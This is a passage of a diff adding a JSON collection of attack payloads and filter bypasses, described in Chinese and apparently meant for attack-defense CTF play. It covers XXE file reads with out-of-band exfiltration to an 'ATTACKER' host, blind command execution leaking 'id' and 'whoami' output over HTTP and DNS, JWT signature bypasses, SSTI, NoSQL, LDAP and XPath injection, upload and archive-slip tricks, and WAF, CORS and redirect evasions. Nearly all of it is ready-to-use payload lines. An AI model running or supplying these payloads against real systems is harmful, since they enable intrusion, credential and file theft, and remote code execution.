+   "body": "<!DOCTYPE r [<!ENTITY % a SYSTEM \"file:///etc/passwd\">%a;]>\n<!DOCTYPE r [<!ENTITY x \"&#x66;ile:///etc/passwd\">]>\n# 用 PUBLIC\n<!DOCTYPE r [<!ENTITY x PUBLIC \"-//x//x\" \"file:///etc/passwd\">]>\n# 大小写\n<!doctype r [<!entity x system \"file:///etc/passwd\">]>"
+  },
+  {
+   "id": "bypass-xxe-oob",
+   "title": "XXE: 无回显外带",
+   "target": "xxe",
+   "description": "有回显限制时把数据塞进 URL 或 FTP 路径。",
+   "body": "<!DOCTYPE r [<!ENTITY % f SYSTEM \"http://ATTACKER/e.dtd\">%f;]>\n# e.dtd\n<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://ATTACKER/?%a;'>\">%b;%c;"
+  },
+  {
+   "id": "bypass-deser-format",
+   "title": "反序列化: 数据格式变形",
+   "target": "deserialization",
+   "description": "同一对象可用多种序列化格式表达，检测常只覆盖一种。",
+   "body": "PHP: O:4:\"Test\":0:{}  →  a:1:{i:0;O:4:\"Test\":0:{}}\nJava: rO0AB...  →  Base64 / gzip 后再 base64\nPython: pickle  →  纯文本 opcode（cos\\nsystem\\n...）\nNode: {\"rce\":\"_$$ND_FUNC$$_function(){...}()\"}"
+  },
+  {
+   "id": "bypass-proto-path",
+   "title": "原型污染: 键名变形",
+   "target": "prototype-pollution",
+   "description": "过滤 __proto__ 时用 constructor.prototype 或 unicode 键。",
+   "body": "{\"__proto__\":{\"x\":1}}\n{\"constructor\":{\"prototype\":{\"x\":1}}}\n{\"__pro\\u0074o__\":{\"x\":1}}\n{\"__proto__ \":{\"x\":1}}\n# query 形式\n?__proto__[x]=1&constructor[prototype][x]=1"
+  },
+  {
+   "id": "bypass-jwt-sig",
+   "title": "JWT: 签名绕过组合",
+   "target": "jwt",
+   "description": "五种绕过一次试完。",
+   "body": "# 1) alg=none\n{\"alg\":\"none\"}\n# 2) 空签名保留原值\n# 3) HS256 + 公钥\n# 4) kid 注入\n{\"alg\":\"HS256\",\"kid\":\"../../../../dev/null\"}\n# 5) jku / x5u\n{\"alg\":\"RS256\",\"jku\":\"http://ATTACKER/jwks.json\"}"
+  },
+  {
+   "id": "bypass-auth-header",
+   "title": "认证绕过: 头部与路径组合",
+   "target": "auth-bypass",
+   "description": "后端按路径鉴权、前端按前缀路由时，这些组合能穿过去。",
+   "body": "X-Forwarded-For: 127.0.0.1\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Forwarded-Host: localhost\n/admin/..;/  →  /admin\n/admin%2f..%2fadmin\n/api/v1/user/../../admin\n# 方法覆盖\nX-HTTP-Method-Override: PUT"
+  },
+  {
+   "id": "bypass-auth-case",
+   "title": "认证绕过: 大小写与后缀",
+   "target": "auth-bypass",
+   "description": "Spring/Shiro 对路径后缀与大小写的匹配差异。",
+   "body": "/admin  →  /Admin  /ADMIN  /admin/\n/admin.do  /admin.action  /admin.json\n/admin%3b  /admin;\n/admin/  /admin//\n# Shiro\n/;/admin  /admin/..;/"
+  },
+  {
+   "id": "bypass-nosqli-op",
+   "title": "NoSQL 注入: 操作符绕过",
+   "target": "nosqli",
+   "description": "过滤 $ 时用 unicode 或数组形式。",
+   "body": "{\"password\":{\"$ne\":1}}\n{\"password\":{\"$gt\":\"\"}}\n{\"password\":{\"$regex\":\"^a\"}}\n# $ 被过滤\n{\"password\":{\"\\u0024ne\":1}}\n# 数组\npassword[$ne]=1\n# JS\n{\"$where\":\"1==1\"}"
+  },
+  {
+   "id": "bypass-archive-name",
+   "title": "压缩包: 条目名绕过",
+   "target": "archive-slip",
+   "description": "路径检测常只查 ../，换编码或软链接。",
+   "body": "../../../../var/www/html/x.php\n..%2f..%2f..%2f..%2fvar/www/html/x.php\n..\\..\\..\\..\\windows\\temp\\x.aspx\n# 软链接穿越\nln -s /var/www/html link  →  条目 link/x.php\n# 绝对路径\n/etc/cron.d/x"
+  },
+  {
+   "id": "bypass-cmd-blind",
+   "title": "盲命令执行: 判断与外带",
+   "target": "rce",
+   "description": "无回显时用时间、DNS、HTTP 三种通道。",
+   "body": "sleep 5\nping -c3 ATTACKER\ncurl http://ATTACKER/`id|base64 -w0`\nnslookup `whoami`.ATTACKER\n# 判断执行点\na;sleep 5  vs  a&&sleep 5  （前者总会等）"
+  },
+  {
+   "id": "bypass-waf-size",
+   "title": "WAF: 大包 / 慢速绕过",
+   "target": "waf",
+   "description": "超过检测上限或分片过慢时，部分 WAF 直接放行。",
+   "body": "# 1) 超大 body（> 8MB）\n# 2) 慢速发送（每字节延迟）\n# 3) 大量无关参数稀释\n?a=1&b=2&...&payload=1' or 1=1--"
+  },
+  {
+   "id": "bypass-waf-ip",
+   "title": "WAF: 源站直连与 Host 伪造",
+   "target": "waf",
+   "description": "绕 WAF 最有效的方式是绕开它。",
+   "body": "# 1) 找源站 IP\ndig +short target.com\ncurl -s https://api.hackertarget.com/hostsearch/?q=target.com\n# 2) 直连源站 + Host 头\ncurl -H 'Host: target.com' http://ORIGIN_IP/\n# 3) 内网回环头\nX-Forwarded-For: 127.0.0.1"
+  },
+  {
+   "id": "bypass-upload-ext-double",
+   "title": "文件上传: 双扩展与解析器差异",
+   "target": "upload",
+   "description": "Nginx/Apache/IIS 对双扩展解析顺序不同。",
+   "body": "x.php.jpg     Apache 从右往左找 → 常不解析\nx.jpg.php     → 解析\nx.php.        Windows 去尾点 → 解析\nx.php%00.jpg  → 截断\nx.php/.       → 部分解析器按 x.php\nx.asp;.jpg    IIS6"
+  },
+  {
+   "id": "bypass-ssti-blacklist",
+   "title": "SSTI: 关键字黑名单绕过",
+   "target": "ssti",
+   "description": "拦 __class__ / os 时用 attr、拼接、request 传参。",
+   "body": "{{''|attr('__class__')}}\n{{''['__cl'+'ass__']}}\n{{''[request.args.a][request.args.b]}}\n{{lipsum['__glo'+'bals__']}}\n{%print(1)%}"
+  },
+  {
+   "id": "bypass-cors-origin",
+   "title": "CORS: Origin 校验绕过",
+   "target": "cors",
+   "description": "正则匹配域名时用后缀与特殊字符穿。",
+   "body": "Origin: https://evil.target.com\nOrigin: https://target.com.evil.com\nOrigin: https://evil.com#target.com\nOrigin: null\nOrigin: http://target.com:evil"
+  },
+  {
+   "id": "bypass-open-redirect-host",
+   "title": "开放重定向: 白名单绕过",
+   "target": "open-redirect",
+   "description": "只校验包含目标域名的写法。",
+   "body": "//evil.com\n/\\evil.com\nhttps:evil.com\nhttps://target.com@evil.com\nhttps://evil.com?target.com\nhttps://evil.com#target.com\n////evil.com"
+  },
+  {
+   "id": "bypass-crlf-filter",
+   "title": "CRLF: 过滤绕过",
+   "target": "crlf",
+   "description": "拦 %0d%0a 时用单换行或宽字符。",
+   "body": "%0a\n%0d\n%0d%0a\n%E5%98%8A%E5%98%8D\n%23%0a  （# 吃掉后续）"
+  },
+  {
+   "id": "bypass-xpath-quote",
+   "title": "XPath: 引号与逻辑绕过",
+   "target": "xpath",
+   "description": "XPath 无注释，用括号与 or 恒真。",
+   "body": "' or '1'='1\n' or 1=1 or ''='\nx' or name()='username' or 'a'='b\n# 无引号时\n1 or 1=1"
+  },
+  {
+   "id": "bypass-ldap-filter",
+   "title": "LDAP: 过滤器注入绕过",
+   "target": "ldap",
+   "description": "过滤 * ) ( 时用转义序列。",
+   "body": "*\n*)(uid=*\nadmin)(&)\nadmin)(|(password=*\n# 转义\n\\2a  \\28  \\29"
+  },
+  {
+   "id": "bypass-graphql-limit",
+   "title": "GraphQL: 限流与深度限制绕过",
+   "target": "graphql",
+   "description": "别名批量与分片绕过速率限制。",
+   "body": "mutation{m1:login(u:\"a\",p:\"1\")m2:login(u:\"a\",p:\"2\")}\n# 数组批量\n[{query:\"{a}\"},{query:\"{b}\"}]\n# 深度绕过\n{a{b{c{d}}}}"
+  },
+  {
+   "id": "bypass-fix-detect",
+   "title": "修复检测: 判断对面补丁是否只做了表面过滤",
+   "target": "info-leak",
+   "description": "AWD 对抗时先探对面的修复方式，再选对应绕过。",
+   "body": "# 1) 是否只加了 addslashes → 用宽字节或数字型\n# 2) 是否只拦关键字 → 用等价函数\n# 3) 是否只拦了参数名 → 换参数\n# 4) 是否只在前端校验 → 直接打接口\n# 5) 是否加了 WAF → 测 header 与分块"
+  }
+ ]
+}
